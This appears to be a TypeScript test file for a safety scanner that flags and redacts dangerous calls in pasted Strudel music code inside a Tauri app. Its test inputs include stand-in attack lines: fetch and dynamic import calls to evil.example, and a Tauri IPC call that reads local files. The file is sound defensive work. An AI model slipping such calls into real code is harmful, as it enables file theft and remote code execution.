// Zero-dependency safety checks. Run: node --experimental-strip-types tests/check_code_safety.ts
import assert from 'node:assert/strict';
import {
  scanCodeSafety,
  applySafetyChoices,
  isSafeSampleCall,
  omittedComment,
  type SafetyFinding,
} from '../src/codeSafety.ts';

let passed = 0;
const ok = (name: string, fn: () => void): void => {
  try { fn(); passed += 1; console.log(`  ok  ${name}`); }
  catch (err) { console.error(`FAIL  ${name}\n      ${(err as Error).message}`); process.exitCode = 1; }
};

ok('normal Strudel code is untouched', () => {
  const code = `setcpm(120)\nsamples({ bd: 'bd.wav' }, 'github:tidalcycles/dirt-samples')\n$: sound("bd ~ sd hh*2").gain(0.9)\n$: note("<c3 e3 g3>*2").sound('sawtooth').lpf(sine.slow(8).range(200,3000))`;
  assert.deepEqual(scanCodeSafety(code).map((f) => f.text), []);
});

ok('strings and comments are not flagged', () => {
  const code = `$: sound("bd fetch(window.x) eval(1)")\n// invoke('read_text_file', { path: 'x' })`;
  assert.equal(scanCodeSafety(code).length, 0);
});

ok('Tauri IPC escape is blocked', () => {
  const f = scanCodeSafety(`window.__TAURI_INTERNALS__.invoke('read_text_file', { path: 'C:/x' })`);
  assert.ok(f.length >= 1);
  assert.equal(f[0].level, 'blocked');
  assert.match(f[0].reason, /files on your computer/);
  assert.equal(f[0].text, 'window.__TAURI_INTERNALS__');
});

ok('network + dynamic import + eval are blocked', () => {
  const code = `fetch('https://evil.example')\nimport('https://evil.example/x.js')\neval('1+1')\nnew Function('x', 'return x')()`;
  assert.equal(scanCodeSafety(code).length, 4);
});

ok('storage and DOM globals are found', () => {
  const code = `localStorage.setItem('x','1'); document.cookie = 'a'; window.location.href = 'https://x'`;
  assert.equal(scanCodeSafety(code).length, 3);
});

ok('remove choice redacts and reports omissions', () => {
  const src = `sound('bd')\nfetch('https://evil.example')\nsound('sd')`;
  const findings = scanCodeSafety(src);
  const result = applySafetyChoices(src, findings, new Set<string>());
  assert.equal(result.omitted.length, 1);
  assert.equal(result.omitted[0], "fetch('https://evil.example')");
  assert.match(result.code, /removed by safety check/);
  assert.match(result.code, /sound\('bd'\)/);
  assert.match(result.code, /sound\('sd'\)/);
});

ok('keep choice preserves original code byte-for-byte', () => {
  const src = `sound('bd')\nfetch('https://evil.example')`;
  const findings: SafetyFinding[] = scanCodeSafety(src);
  const result = applySafetyChoices(src, findings, new Set(findings.map((f) => f.id)));
  assert.equal(result.code, src);
  assert.equal(result.omitted.length, 0);
  assert.equal(result.kept.length, 1);
});

ok('redacted code stays syntactically valid', () => {
  const src = `$: sound('bd')\nfetch('https://evil.example')\nwindow.__TAURI_INTERNALS__.invoke('read_text_file', { path: 'x' })`;
  const result = applySafetyChoices(src, scanCodeSafety(src), new Set<string>());
  assert.doesNotThrow(() => new Function(result.code));
  assert.ok(!result.code.includes('_INTERNALS__ */.'));
});

ok('sample call grammar: plain and object forms pass, escapes fail', () => {
  assert.equal(isSafeSampleCall("samples('github:tidalcycles/dirt-samples')"), true);
  assert.equal(isSafeSampleCall("samples({ bd: 'bd.wav' }, 'https://x/y/')"), true);
  assert.equal(isSafeSampleCall("samples(fetch('https://evil'))"), false);
  assert.equal(isSafeSampleCall("samples('a')\nfetch('b')"), false);
  assert.equal(isSafeSampleCall("samples('a'"), false); // unbalanced
});

ok('omittedComment is one line per omission', () => {
  assert.deepEqual(omittedComment(['fetch("x")', 'eval("y")']), [
    '// ⚠ omitted from pasted code: fetch("x")',
    '// ⚠ omitted from pasted code: eval("y")',
  ]);
});

console.log(`\n${passed} checks passed`);
